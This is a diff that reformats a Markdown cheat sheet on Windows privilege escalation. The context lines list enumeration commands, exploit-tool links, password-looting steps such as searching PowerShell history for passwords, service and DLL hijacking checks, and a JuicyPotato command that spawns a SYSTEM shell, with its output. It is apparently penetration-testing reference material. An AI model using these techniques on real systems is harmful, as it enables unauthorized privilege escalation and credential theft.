@@ -1,6 +1,6 @@
-# LPE Windows
+# Priv-Esc Windows
 
-## Tools
+## **Tools**
 
 DOTNET CSHARP
 
@@ -25,7 +25,9 @@ EXE CLASSIC
 * [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
 * [WindowsExploits](https://github.com/abatchy17/WindowsExploits)
 
-## Basic info
+---
+
+## **Basic info**
 
 ### System enumeration
 
@@ -55,6 +57,8 @@ wmic logicaldisk get caption || fsutil fsinfo drives
 wmic logicaldisk get caption,description,providername
 Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
 ```
+
+---
 
 ### User enumeration
 
@@ -111,6 +115,8 @@ net localgroup administrators
 Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
 ```
+
+---
 
 ### Network enumeration
 
@@ -180,7 +186,9 @@ reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
 Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 ```
 
-## Password looting
+---
+
+## **Password looting**
 
 ### Tools
 
@@ -305,7 +313,9 @@ cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
 
-## Services
+---
+
+## **Services**
 
 ### Tools
 
@@ -452,7 +462,9 @@ GENERIC_WRITE (inherits SERVICE_CHANGE_CONFIG)
 GENEROC_ALL (inherits SERVICE_CHANGE_CONFIG)
 ```
 
-## Kernel Exploitation
+---
+
+## **Kernel Exploitation**
 
 ### Tools
 
@@ -475,13 +487,17 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn
 wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
 ```
 
-## Insecure GUI apps
+---
+
+## **Insecure GUI apps**
 
 Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.
 
 Example: "Windows Help and Support" \(Windows + F1\), search for "command prompt", click on "Click to open Command Prompt"
 
-## Abusing privileges
+---
+
+## **Abusing privileges**
 
 Tools
 
@@ -575,7 +591,9 @@ JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-45
     [+] CreateProcessWithTokenW OK
 ```
 
-## DLL hijacking
+---
+
+## **DLL hijacking**
 
 Tools
 
@@ -607,7 +625,9 @@ dll missing search paths order :
 icacls C:\Perl64
 ```
 
-## Vulnerable Drivers
+---
+
+## **Vulnerable Drivers**
 
 ```bat
 https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery
@@ -617,7 +637,9 @@ driverquery.exe /fo table
 DriverQuery.exe --no-msft
 ```
 
-## Named Pipes
+---
+
+## **Named Pipes**
 
 Tools
 
@@ -634,12 +656,16 @@ Reverse engineering software
 Send data throught the named pipe : program.exe >\\.\pipe\StdOutPipe 2>\\.\pipe\StdErrPipe
 ```
 
-## Refs
+---
+
+## **Refs**
 
 - [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation) 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 
-## To check
+---
+
+## **To check**
 
 Invoke-WCMDump -- Extracts crendentials from Credential Manager. Detected. DomainPasswordSpray -- Spray gathered passwords across domain Inveigh -- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool.
 
